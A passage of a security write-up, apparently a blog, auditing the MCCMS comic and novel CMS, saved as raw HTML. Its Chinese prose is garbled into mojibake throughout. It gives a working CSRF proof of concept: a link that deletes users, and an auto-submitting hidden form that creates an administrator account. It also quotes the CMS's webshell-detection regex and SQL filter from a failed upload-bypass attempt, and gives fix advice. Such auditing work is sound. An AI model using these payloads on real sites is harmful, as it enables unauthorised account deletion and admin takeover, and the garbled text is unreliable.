class="comment">/*implode â€”ç”¨å­—ç¬¦ä¸²è¿æ¥æ•°ç»„å…ƒç´ */</span></span><br><span class="line"> 	    	<span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ids</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]+[,]?)+$/&#x27;</span>, <span class="variable">$ids</span>))&#123;</span><br><span class="line">				<span class="variable">$id</span> = <span class="variable">$ids</span>;</span><br><span class="line">			&#125;</span><br><span class="line"> 	    &#125;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;IDä¸èƒ½ä¸ºç©º~!&#x27;</span>);</span><br><span class="line"> 	    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line"> 	    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$_id</span>) &#123;</span><br><span class="line"> 	    	<span class="comment">//åˆ é™¤å¤´åƒåœ°å€</span></span><br><span class="line">			<span class="variable">$pic</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;tongbu&#x27;</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;tongbu-&gt;<span class="title function_ invoke__">del</span>(<span class="variable">$pic</span>);</span><br><span class="line">			<span class="comment">//åˆ é™¤è®°å½•</span></span><br><span class="line">    		<span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_del</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$_id</span>);</span><br><span class="line"> 	    &#125;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;æ­å–œæ‚¨ï¼Œåˆ é™¤æˆåŠŸ~!&#x27;</span>;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">links</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p><code>CSRF</code>æ­¤å¤„ä»¥ç®¡ç†å‘˜å¯ä»¥åˆ é™¤ç”¨æˆ·ä¸ºä¾‹</p>
<p>è¿™æ˜¯åœ¨åˆ é™¤ç”¨æˆ·æ—¶è¿›è¡Œçš„æŠ“åŒ…æ•°æ®ï¼Œå‘ç°å…¶ä¿¡æ¯çš†ä»¥æ˜æ–‡æ˜¾ç¤ºï¼Œåªè¦ä¿®æ”¹<code>id</code>æ•°æ®å°±å¯ä»¥è¾¾åˆ°åˆ é™¤æŒ‡å®šç”¨æˆ·çš„ç›®çš„</p>
<p><img src="/post/CMS-Test/image-20221126222051780.png" alt="image-20221126222051780"></p>
<p>å…ˆåˆ›å»º<code>2</code>ä¸ªç”¨æˆ·ï¼Œ<code>id</code>ä¸º<code>3ï¼Œ4</code></p>
<p><img src="/post/CMS-Test/image-20221126222725930.png" alt="image-20221126222725930"></p>
<p>ç„¶åæ ¹æ®æˆ‘ä»¬çš„æŠ“åŒ…æ•°æ®æ„é€ ä¸€ä¸ªé’“é±¼çš„é“¾æ¥</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;http://127.0.0.3/admin.php/user/del?id%5B%5D=3&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;  </span><br><span class="line"><span class="comment">#è¿™é‡Œçš„idä»¥GETæ–¹å¼æäº¤ä¹Ÿå¯ä»¥</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20221126224127893.png" alt="image-20221126224127893"></p>
<p>ä¿æŒç™»å½•çš„çŠ¶æ€ç‚¹å‡»</p>
<p><img src="/post/CMS-Test/image-20221126224210939.png" alt="image-20221126224210939"></p>
<p>ä¹Ÿè¯•äº†è¯•<code>4</code></p>
<p><img src="/post/CMS-Test/image-20221126224303900.png" alt="image-20221126224303900"></p>
<p>å‘ç°ä¹Ÿæ˜¾ç¤ºæˆåŠŸ</p>
<p>è¿™æ˜¯æˆ‘ä»¬è¿”å›åå°æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</p>
<p><img src="/post/CMS-Test/image-20221126224401491.png" alt="image-20221126224401491"></p>
<p>å‘ç°åªæœ‰<code>ID=1</code>çš„ç”¨æˆ·äº†</p>
<p>æˆ‘ä»¬çš„<code>csrf</code>ä¹Ÿå°±æ”»å‡»æˆåŠŸäº†</p>
<p>ç”šè‡³æ·»åŠ åå°ç®¡ç†å‘˜è´¦æˆ·ä¹Ÿæ˜¯å¯ä»¥</p>
<p><img src="/post/CMS-Test/image-20221128180130164.png" alt="image-20221128180130164"></p>
<p><img src="/post/CMS-Test/image-20221128180148359.png" alt="image-20221128180148359"></p>
<p>æ„é€ é’“é±¼é“¾æ¥</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>MCCMS POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;btn2()&quot;</span>&gt;</span>MCCMS CSRF<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.3/admin.php/sys/save&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nichen&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ttoc&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">btn2</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> f = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            f.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>post</code>æ–¹å¼ä»¥ç«ç‹æµè§ˆå™¨æäº¤</p>
<p><img src="/post/CMS-Test/image-20221128201313981.png" alt="image-20221128201313981"></p>
<p>æäº¤æˆåŠŸï¼ŒæˆåŠŸå‘åå°æ·»åŠ äº†æˆ‘ä»¬çš„æ¶æ„ç”¨æˆ·</p>
<p><img src="/post/CMS-Test/image-20221128201331468.png" alt="image-20221128201331468"></p>
<blockquote>
<p>é™¤æ­¤ä»¥å¤–</p>
<p>å…¶ä»–ç®¡ç†å‘˜å¯ä»¥æ§åˆ¶çš„æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹ç”¨æˆ·é‡‘å¸æ•°ï¼Œæœˆç¥¨æ•°ç­‰ç­‰ï¼Œå› ä¸ºéƒ½æ˜¯ä»¥æ˜æ–‡æäº¤ï¼Œéƒ½å¯ä»¥ç”¨csrfå®ç°</p>
</blockquote>
<hr>
<h4 id="ä¿®å¤å»ºè®®-2"><a href="#ä¿®å¤å»ºè®®-2" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><blockquote>
<p>æ­¤å¤„æˆ‘ä»¬å‘ç°ç”¨æˆ·å‡­æ®å‘ç°ä»¥æ˜æ–‡å½¢å¼å‘é€<br>é‚£ä¹ˆä¸­é—´å°±å¯èƒ½è¢«ç¬¬ä¸‰æ–¹è·å–å¹¶åˆ©ç”¨ï¼Œæ‰€ä»¥å»ºè®®</p>
<p>1.å¯¹æ•°æ®è¿›è¡Œè¿›ä¸€æ­¥çš„åŠ å¯†<br>2.å¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨åå°æœåŠ¡å™¨ç«¯éªŒè¯tokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰tokenæˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºè¯·æ±‚å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œä»è€Œæ‹’ç»è¯¥è¯·æ±‚<br>3.éªŒè¯è¯·æ±‚çš„refererå€¼<br>4.å¯¹å‚æ•°ä¼ å…¥æ–¹å¼å’ŒéªŒè¯çš„è¿‡ç¨‹ä¸¥æ ¼æ§åˆ¶ï¼Œä»¥å…ä¼ å…¥å¤–æ¥æ¶æ„æ•°æ®ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²æˆ–ä¸¢å¤±<br>5.ç”¨æˆ·äºŒæ¬¡éªŒè¯ï¼Œå¯¹äºè¿™ç§ä¸å¯é€†æ“ä½œæ‰§è¡Œå‰è¿›è¡Œæ¯”å¦‚æ‰‹æœºéªŒè¯ç ä¹‹ç±»çš„ç¬¬äºŒæ¬¡éªŒè¯ï¼Œä¸ä»¥cookieä¸ºå”¯ä¸€éªŒè¯</p>
</blockquote>
<h3 id="4-ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´-å¤ç°å¤±è´¥"><a href="#4-ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´-å¤ç°å¤±è´¥" class="headerlink" title="4.ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´(å¤ç°å¤±è´¥)"></a>4.ä½œå®¶å‘å¸ƒæ¼«ç”»å°è¯´å‘½ä»¤æ‰§è¡Œæ¼æ´(å¤ç°å¤±è´¥)</h3><h4 id="ä»£ç åˆ†æ-æ¼æ´åˆ©ç”¨-1"><a href="#ä»£ç åˆ†æ-æ¼æ´åˆ©ç”¨-1" class="headerlink" title="ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨"></a>ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨</h4><blockquote>
<p>çŒœæµ‹<br>1.å‘å¸ƒæœ¨é©¬æ–‡ä»¶ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œ<br>2.ä¸€äº›å®¢æˆ·ç«¯å¯ä»¥ä¿®æ”¹çš„å‚æ•°ï¼Œè¢«å‘½ä»¤æ‰§è¡Œå‡½æ•°åŒ…å«ä¸”æ‰§è¡Œ</p>
</blockquote>
<p>ä½†æ ¹æ®çš„<code>2.5.8</code>æ›´æ–°æ–‡æ¡£</p>
<blockquote>
<p>Mccmsæ¼«ç”»å°è¯´ç³»ç»Ÿ-v2.5.8æ›´æ–°è¯¦æƒ…<br>1.ä¿®å¤äº†SQLæ³¨å…¥é«˜å±æ¼æ´<br>2.ä¿®å¤äº†æœ¨é©¬ä¼ªè£…å›¾ç‰‡ä¸Šä¼ æ¼æ´</p>
</blockquote>
<p>æ‰€ä»¥å¦‚æœé€šè¿‡æ¼«ç”»å›¾ç‰‡ä¸Šä¼ æœ¨é©¬ï¼Œå¤§æ¦‚ç‡æ˜¯è¡Œä¸é€šäº†</p>
<p>å…ˆæ³¨å†Œå®Œä¿¡æ¯ï¼Œå†åå°å®Œæˆä½œè€…è®¤è¯</p>
<p><img src="/post/CMS-Test/image-20221122151951892.png" alt="image-20221122151951892"></p>
<p><img src="/post/CMS-Test/image-20221122152043515.png" alt="image-20221122152043515"></p>
<h5 id="æ¼«ç”»"><a href="#æ¼«ç”»" class="headerlink" title="æ¼«ç”»"></a>æ¼«ç”»</h5><p>ä½†æ˜¯ä¹Ÿå¯ä»¥è¯•è¯•ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œçœ‹çœ‹å®ƒæ€ä¹ˆä¿®å¤çš„</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œé™åˆ¶äº†æ–‡ä»¶ç±»å‹ï¼Œå¯ä»¥è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡</span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20221122152444788.png" alt="image-20221122152444788"></p>
<p>ç›´æ¥ä¸Šä¼ è„šæœ¬æ–‡ä»¶ä¼šè¢«æ‹¦æˆª</p>
<p><img src="/post/CMS-Test/image-20221122153207506.png" alt="image-20221122153207506"></p>
<p>ä¸Šä¼ å›¾ç‰‡ğŸçš„è¯ ï¼Œä¼šæ˜¾ç¤ºéæ³•å›¾ç‰‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Chapter.php</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">do_upload</span>(<span class="string">&#x27;image&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">display_errors</span>();</span><br><span class="line">            <span class="title function_ invoke__">get_json</span>(<span class="variable">$msg</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">data</span>();</span><br><span class="line">            <span class="variable">$img_path_file</span> = <span class="variable">$arr</span>[<span class="string">&#x27;full_path&#x27;</span>];</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">checkPicHex</span>(<span class="variable">$img_path_file</span>);</span><br><span class="line">           <span class="comment">/*å…³é”®åœ¨è¿™é‡Œï¼Œè®©å¯¹æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡çš„å†…å®¹è¿›è¡Œäº†æ£€æŸ¥å¯¼è‡´æ— æ³•ä¸Šä¼ */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> == <span class="number">1</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;éæ³•å›¾ç‰‡&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//æ£€æŸ¥ä¸Šä¼ å›¾ç‰‡æ˜¯å¦åŒ…å«æœ¨é©¬</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPicHex</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$resource</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        <span class="variable">$fileSize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="number">0</span>);<span class="comment">//æŠŠæ–‡ä»¶æŒ‡é’ˆç§»åˆ°æ–‡ä»¶çš„å¼€å¤´</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fileSize</span> &gt; <span class="number">512</span>)&#123; <span class="comment">// è‹¥æ–‡ä»¶å¤§äº521Bæ–‡ä»¶å–å¤´å’Œå°¾</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*fread â€”äºŒè¿›åˆ¶å®‰å…¨æ–‡ä»¶è¯»å–*/</span></span><br><span class="line">            <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span> - <span class="number">512</span>);<span class="comment">//æŠŠæ–‡ä»¶æŒ‡é’ˆç§»åˆ°æ–‡ä»¶å°¾éƒ¨</span></span><br><span class="line">            <span class="variable">$hexCode</span> .= <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>,<span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*bin2hex â€”å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤º*/</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// å–å…¨éƒ¨</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$resource</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(3c25.*?28.*?29.*?253e)|(3c3f.*?28.*?29.*?3f3e)|(3C534352495054)|(2F5343524950543E)|(3C736372697074)|(2F7363726970743E)/is&quot;</span>,<span class="variable">$hexCode</span>))</span><br><span class="line">        <span class="comment">/*åŒ¹é…16è¿›åˆ¶ä¸­ä¸€å¥è¯æœ¨é©¬ä¸­ç‰¹å¾ç¼–ç </span></span><br><span class="line"><span class="comment">        è¿‡æ»¤</span></span><br><span class="line"><span class="comment">        &lt;%()%&gt;</span></span><br><span class="line"><span class="comment">        &lt;?()?&gt;</span></span><br><span class="line"><span class="comment">        &lt;script&gt;()&lt;/script&gt;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="comment">//åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">        	<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*ä¹Ÿå°±æ˜¯æŠŠå›¾ç‰‡ä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»å–çš„æ•°æ®å†è¿›è¡Œåå…­è¿›åˆ¶è½¬åŒ–ï¼Œæœ€åè¿›è¡Œæ­£åˆ™åŒ¹é…è¿‡æ»¤ï¼Œçœ‹æ¥ç»•è¿‡ç¡®å®ä¸å®¹æ˜“*/</span></span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸ä¸Šä¼ å›¾ç‰‡ï¼Œ</p>
<p><img src="/post/CMS-Test/image-20221122152819257.png" alt="image-20221122152819257"></p>
<p>æˆåŠŸ</p>
<p><img src="/post/CMS-Test/image-20221122154113084.png" alt="image-20221122154113084"></p>
<p>è€Œä¸”è¿˜å›æ˜¾äº†å›¾ç‰‡ä¸Šä¼ çš„è·¯å¾„</p>
<p>è¯•è¯•èƒ½ä¸èƒ½è®¿é—®</p>
<p><img src="/post/CMS-Test/image-20221122162549084.png" alt="image-20221122162549084"></p>
<p>å‘ç°æ˜¯å¯ä»¥è®¿é—®è¿™ä¸ªç›®å½•ä¸‹çš„å›¾ç‰‡æ–‡ä»¶çš„</p>
<p>ä½†å½“æˆ‘åœ¨è¿™ä¸ªè·¯å¾„ç›®å½•ç›´æ¥æ”¾äº†è„šæœ¬æ–‡ä»¶ï¼Œå†è®¿é—®æ—¶</p>
<p><img src="/post/CMS-Test/image-20221122165943218.png" alt="image-20221122165943218"></p>
<p>å‘ç°è¢«é˜»æ­¢äº†ï¼Œä¹Ÿå°±æ˜¯<code>apchae</code>åœ¨è¿™ä¸ª<strong>å›¾ç‰‡å­˜å‚¨ç›®å½•è®¾ç½®äº†è„šæœ¬æ–‡ä»¶çš„è®¿é—®æƒé™ç¦æ­¢ï¼Œé‚£ä¹ˆå°±æ— æ³•åˆ©ç”¨åœ¨è¿™ä¸ªç›®å½•ä¸‹çš„è„šæœ¬æ–‡ä»¶</strong></p>
<p>æ‰€ä»¥ï¼Œè¦ä¹ˆä¿®æ”¹ä¸Šä¼ çš„è·¯å¾„ï¼Œæ¯”å¦‚åˆ°ç½‘ç«™çš„è‡ªèº«è„šæœ¬ç›®å½•ä¸‹ï¼Œè¿›è¡Œè®¿é—®æ‰§è¡Œ</p>
<hr>
<h5 id="å°è¯´"><a href="#å°è¯´" class="headerlink" title="å°è¯´"></a>å°è¯´</h5><p>æŠ“åŒ…å°è¯´ï¼Œå‘ç°ç»•è¿‡äº†å­—æ•°è¿‡å°‘çš„é™åˆ¶ï¼Œè€Œä¸”ä¹Ÿç»•è¿‡äº†å°è¯´åå°å®¡æ ¸</p>
<p><img src="/post/CMS-Test/image-20221122222054711.png" alt="image-20221122222054711"></p>
<p>æˆ‘ä»¬æŠ“åŒ…ä¿®æ”¹çš„å†…å®¹æ²¡æœ‰ç»è¿‡åå°ç›´æ¥åˆ°äº†å­˜å‚¨ç›®å½•</p>
<p><img src="/post/CMS-Test/image-20221122222413963.png" alt="image-20221122222413963"></p>
<p>åé¢å‘ç°æ˜¯ç”±äºæºç ä¸­ï¼Œå¯¹ç­¾çº¦ç”¨æˆ·è‡ªåŠ¨å®¡æ ¸é€šè¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">            <span class="comment">//åˆ¤æ–­ç­¾çº¦ï¼Œç­¾çº¦ç”¨æˆ·è‡ªåŠ¨å®¡æ ¸</span></span><br><span class="line">            <span class="variable">$signing</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;signing&#x27;</span>,<span class="variable">$uid</span>);</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;yid&#x27;</span>] = <span class="variable">$signing</span> == <span class="number">1</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;bid&#x27;</span>] = <span class="variable">$bid</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ä¸»è¦å¯¹åŠ¨æ¼«å’Œå°è¯´åå­—ï¼Œä»¥åŠè¯„è®ºå¤„è¿˜è¿›è¡Œäº†<code>sql</code>æ³¨å…¥é™åˆ¶</p>
<p><img src="/post/CMS-Test/image-20221123201716429.png" alt="image-20221123201716429"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQLè¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span 